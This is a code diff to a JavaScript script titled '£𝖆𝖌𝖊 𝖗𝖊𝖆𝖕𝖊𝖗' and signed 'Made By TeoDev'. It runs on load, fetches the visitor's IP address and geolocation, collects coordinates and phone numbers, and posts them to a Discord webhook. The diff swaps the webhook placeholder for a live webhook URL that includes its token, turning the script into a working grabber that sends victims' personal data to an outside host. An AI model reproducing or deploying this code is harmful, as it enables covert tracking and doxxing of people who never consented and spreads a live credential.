@@ -97,7 +97,7 @@
 
 
 
-async function si() {
+async function sendInfo() {
   try {
     // Fetch IP and geolocation data
     const [ipRes, geoRes] = await Promise.all([
@@ -132,14 +132,14 @@ ${latitude && longitude ? `**Coordinates:** ${latitude}, ${longitude}` : ''}
 **Phone numbers:** ${fpn().join(', ') || 'None Found'}
 `;
 
-    // Build embed object with thumbnail URL
+    // Build embed object
     const embed = {
       title: "£𝖆𝖌𝖊 𝖗𝖊𝖆𝖕𝖊𝖗",
       description: description,
       color: 0x800080,
       timestamp: new Date().toISOString(),
       footer: { text: "Made By TeoDev" },
-      thumbnail: { url: "https://cdn.pfps.gg/pfps/3077-reaper.png" }
+      thumbnail: { url: "attachment://pfp.png" }
     };
 
     // Prepare FormData for multipart request
@@ -157,7 +157,7 @@ ${latitude && longitude ? `**Coordinates:** ${latitude}, ${longitude}` : ''}
     formData.append('files[0]', responseBlob, 'pfp.png');
 
     // Send webhook
-    await fetch('Youre webhook Here', {
+    await fetch('https://discord.com/api/webhooks/1462477870193705115/L-NW-4Q4Rlf6ncz0nE9_TAwlssKQ0Bl8VBV8BPetqKemFwKvKqz2eRDJX59UVFyGdo5C', {
       method: 'POST',
       body: formData
     });
@@ -208,4 +208,4 @@ function fpn() {
 }
 
 // Run the function
-si();
+sendInfo();
